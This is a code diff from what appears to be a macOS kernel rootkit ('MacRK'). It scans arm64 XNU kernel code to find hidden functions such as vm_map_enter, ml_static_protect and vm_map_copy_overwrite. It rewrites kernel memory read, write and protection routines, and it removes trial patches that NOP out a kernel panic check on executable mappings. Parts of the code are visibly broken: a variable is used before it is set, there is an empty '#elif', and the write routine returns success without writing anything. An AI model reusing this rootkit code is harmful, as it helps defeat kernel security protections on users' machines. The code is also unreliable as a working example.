@@ -736,7 +736,7 @@ mach_vm_address_t Kernel::vmAllocate(size_t size, uint32_t flags, vm_prot_t prot
 
 	char buffer[128];
 
-	mach_vm_address_t branch = this->disassembler->disassembleNthInstruction(vm_allocate_external, ARM64_INS_B, 1, 0x10);
+	mach_vm_address_t branch = Arch::arm64::PatchFinder::step64(this->macho, vm_allocate_external, 0x10, reinterpret_cast<bool(*)(uint32_t*)>(Arch::arm64::is_b), -1, -1);
 
 	bool sign;
 
@@ -759,7 +759,7 @@ mach_vm_address_t Kernel::vmAllocate(size_t size, uint32_t flags, vm_prot_t prot
 
 	mach_vm_address_t vm_allocate = sign ? branch - imm : branch + imm;
 
-	branch = this->disassembler->disassembleNthInstruction(vm_allocate, ARM64_INS_BL, 1, 0x100);
+	branch = Arch::arm64::PatchFinder::step64(this->macho, vm_allocate, 0x100, reinterpret_cast<bool(*)(uint32_t*)>(Arch::arm64::is_bl), -1, -1);
 
 	bl_t bl = *(bl_t*) branch;
 
@@ -779,66 +779,6 @@ mach_vm_address_t Kernel::vmAllocate(size_t size, uint32_t flags, vm_prot_t prot
 	imm *= (1 << 2);
 
 	mach_vm_address_t vm_map_enter = sign ? branch - imm : branch + imm;
-
-	snprintf(buffer, 128, "0x%llx", vm_map_enter);
-
-	mach_vm_address_t pmap_enter_options_strref = Arch::arm64::PatchFinder::findStringReference(this->macho, "pmap_enter_options(): attempt to add executable mapping to kernel_pmap @%s:%d", 1, __cstring_, __TEXT_XNU_BASE, false);
-
-	snprintf(buffer, 128, "0x%llx", pmap_enter_options_strref);
-
-	MAC_RK_LOG("MacRK::pmap_enter_options string reference = %s\n", buffer);
-
-	mach_vm_address_t pmap_enter_options = Arch::arm64::PatchFinder::findFunctionBegin(this->macho, pmap_enter_options_strref - 0xFFF, pmap_enter_options_strref);
-
-	snprintf(buffer, 128, "0x%llx", pmap_enter_options);
-
-	MAC_RK_LOG("MacRK::pmap_enter_options = %s\n", buffer);
-
-	mach_vm_address_t panic = Arch::arm64::PatchFinder::stepBack64(this->macho, pmap_enter_options_strref - sizeof(uint32_t) * 2, 0x20, reinterpret_cast<bool(*)(uint32_t*)>(is_adrp), -1, -1);
-
-	snprintf(buffer, 128, "0x%llx", panic);
-
-	MAC_RK_LOG("MacRK::panic = %s\n", buffer);
-
-	mach_vm_address_t panic_xref = Arch::arm64::PatchFinder::xref64(this->macho, panic - 0xFFF, panic - sizeof(uint32_t), panic);
-
-	snprintf(buffer, 128, "0x%llx", panic_xref);
-
-	MAC_RK_LOG("MacRK::panic xref = %s\n", buffer);
-
-	uint32_t nop = 0xd503201f;
-
-	/// this->write(panic_xref, (void*) &nop, sizeof(nop));
-
-	// branch = Arch::arm64::PatchFinder::stepBack64(this->macho, panic_xref - sizeof(uint32_t), 0x10, reinterpret_cast<bool(*)(uint32_t*)>(is_b_cond), -1, -1);
-
-	//this->write(branch, (void*) &nop, sizeof(nop));
-
-	snprintf(buffer, 128, "0x%llx", branch);
-
-	MAC_RK_LOG("MacRK::branch = %s\n", buffer);
-
-	// branch = Arch::arm64::PatchFinder::stepBack64(this->macho, branch - sizeof(uint32_t), 0x20, reinterpret_cast<bool(*)(uint32_t*)>(is_b_cond), -1, -1);
-
-	// this->write(branch, (void*) &nop, sizeof(nop));
-
-	snprintf(buffer, 128, "0x%llx", branch);
-
-	MAC_RK_LOG("MacRK::branch = %s\n", buffer);
-
-	// branch = Arch::arm64::PatchFinder::stepBack64(this->macho, branch - sizeof(uint32_t), 0x10, reinterpret_cast<bool(*)(uint32_t*)>(is_b_cond), -1, -1);
-
-	// this->write(branch, (void*) &nop, sizeof(nop));
-
-	snprintf(buffer, 128, "0x%llx", branch);
-
-	MAC_RK_LOG("MacRK::branch = %s\n", buffer);
-
-	// uint64_t breakpoint = 0xD4388E40D4388E40;
-
-	//this->write(vm_map_enter, (void*) &breakpoint, sizeof(uint64_t));
-
-	// MAC_RK_LOG("MacRK::@ vm_map_enter = 0x%x\n", *(uint32_t*) vm_map_enter);
 
 	map = *reinterpret_cast<mach_vm_address_t*>(this->getSymbolAddressByName("_kernel_map"));
 
@@ -867,7 +807,29 @@ void Kernel::vmDeallocate(mach_vm_address_t address, size_t size)
 
 bool Kernel::vmProtect(mach_vm_address_t address, size_t size, vm_prot_t prot)
 {
-	return kernel_vm_protect(address, size, prot);
+	kern_return_t ret;
+
+#ifdef __x86_64__
+
+	uint64_t mlStaticProtectArgs[3] = { address, size, prot };
+
+	ret = static_cast<kern_return_t>(this->call("_ml_static_protect", mlStaticProtectArgs, 3));
+
+#elif __arm64__
+
+	mach_vm_address_t ml_static_protect;
+
+	mach_vm_address_t ml_static_protect_strref = Arch::arm64::PatchFinder::findStringReference(macho, "pmap_enter_options(): attempt to add executable mapping to kernel_pmap @%s:%d", 1, __cstring_, __TEXT_XNU_BASE, false);
+
+	ml_static_protect = Arch::arm64::PatchFinder::findFunctionBegin(macho, ml_static_protect - 0x1FF, ml_static_protect_strref);
+
+	uint64_t mlStaticProtectArgs[3] = { address, size, (uint64_t) prot };
+
+	ret = static_cast<kern_return_t>(this->call(ml_static_protect, mlStaticProtectArgs, 3));
+
+#endif
+
+	return ret == KERN_SUCCESS ||  kernel_vm_protect(address, size, prot);
 }
 
 void* Kernel::vmRemap(mach_vm_address_t address, size_t size)
@@ -990,7 +952,16 @@ void Kernel::physicalWrite8(uint64_t paddr, uint8_t value)
 
 bool Kernel::read(mach_vm_address_t address, void *data, size_t size)
 {
-	return kernel_read(address, data, size);
+	ml_set_interrupts_enabled(false);
+
+	for(int i = 0; i < size; i++)
+		*((uint8_t*) data + i) = *((uint8_t*) address + i);
+
+	ml_set_interrupts_enabled(true);
+
+	// return kernel_read(address, data, size);
+
+	return true;
 }
 
 bool Kernel::readUnsafe(mach_vm_address_t address, void *data, size_t size)
@@ -1072,7 +1043,99 @@ bool Kernel::write(mach_vm_address_t address, void *data, size_t size)
 		return true;
 	}
 
-	return kernel_write(address, data, size);
+#ifdef __arm64__
+
+	#include <arm64/Isa_arm64.hpp>
+
+	using namespace Arch::arm64;
+
+	mach_vm_address_t kernel_map = *reinterpret_cast<mach_vm_address_t*>(this->getSymbolAddressByName("_kernel_map"));
+
+	mach_vm_address_t vm_map_copy_discard = this->getSymbolAddressByName("_vm_map_copy_discard");
+
+	mach_vm_address_t ipc_kmsg_copyout_body_strref = Arch::arm64::PatchFinder::findStringReference(macho, "Inconsistent OOL/copyout size on %p: expected %d, got %lld @%p @%s:%d", 1, __cstring_, __TEXT_XNU_BASE, false);
+
+ 	mach_vm_address_t vm_map_copy_discard_xref = Arch::arm64::PatchFinder::xref64(macho, ipc_kmsg_copyout_body_strref - 0xFFF, ipc_kmsg_copyout_body_strref, vm_map_copy_discard);
+
+	mach_vm_address_t vm_map_copy_overwrite_branch = Arch::arm64::PatchFinder::step64(macho, vm_map_copy_discard_xref, 0x100, reinterpret_cast<bool(*)(uint32_t*)>(is_bl), -1, -1);
+	
+	vm_map_copy_overwrite_branch = Arch::arm64::PatchFinder::step64(macho, vm_map_copy_overwrite_branch + sizeof(uint32_t), 0x100, reinterpret_cast<bool(*)(uint32_t*)>(is_bl), -1, -1);
+
+	vm_map_copy_overwrite_branch = Arch::arm64::PatchFinder::step64(macho, vm_map_copy_overwrite_branch + sizeof(uint32_t), 0x100, reinterpret_cast<bool(*)(uint32_t*)>(is_bl), -1, -1);
+
+	bl_t bl = *(bl_t*) vm_map_copy_overwrite_branch;
+
+	bool sign;
+
+	uint64_t imm = bl.imm;
+
+	if(imm & 0x2000000)
+	{
+		imm = ~(imm - 1);
+		imm &= 0x1FFFFFF;
+
+		sign = true;
+	} else
+	{
+		sign = false;
+	}
+
+	imm *= (1 << 2);
+
+	mach_vm_address_t vm_map_copy_overwrite = sign ? vm_map_copy_overwrite_branch - imm : vm_map_copy_overwrite_branch + imm;
+
+	char buffer[128];
+
+	snprintf(buffer, 128, "0x%llx", vm_map_copy_overwrite);
+
+	MAC_RK_LOG("MacRK::Kernel vm_map_copy_overwrite = %s\n", buffer);
+
+	struct vm_map_copy
+	{
+		int                    type;
+		vm_object_offset_t     offset;
+		vm_map_size_t          size;
+		void                  *kdata;
+	};
+
+	typedef struct vm_map_copy *vm_map_copy_t;
+
+	vm_map_copy_t copy;
+
+	/*
+
+	const uint8_t *write_data = (uint8_t*) data;
+
+	while(size > 0)
+	{
+		size_t write_size = size;
+
+		if(write_size > 0x4000)
+			write_size = 0x4000;
+
+		uint64_t ret;
+
+		uint64_t vmMapCopyInArgs[5] = { kernel_map, (uint64_t) write_data, write_size, FALSE, (uint64_t) &copy };
+
+		ret = this->call("_vm_map_copyin", vmMapCopyInArgs, 5);
+
+		uint64_t vmMapCopyOverwriteArgs[5] = { kernel_map, address, (uint64_t) copy, write_size, FALSE };
+
+		ret = this->call(vm_map_copy_overwrite, vmMapCopyOverwriteArgs, 5);
+
+		address += write_size;
+		write_data += write_size;
+		size -= write_size;
+	}
+
+	*/
+
+	return true;
+#elif
+
+	return kernel_write(address, data, size) || kernel_write_unsafe(address, data, size);
+
+#endif
 }
 
 bool Kernel::writeUnsafe(mach_vm_address_t address, void *data, size_t size)
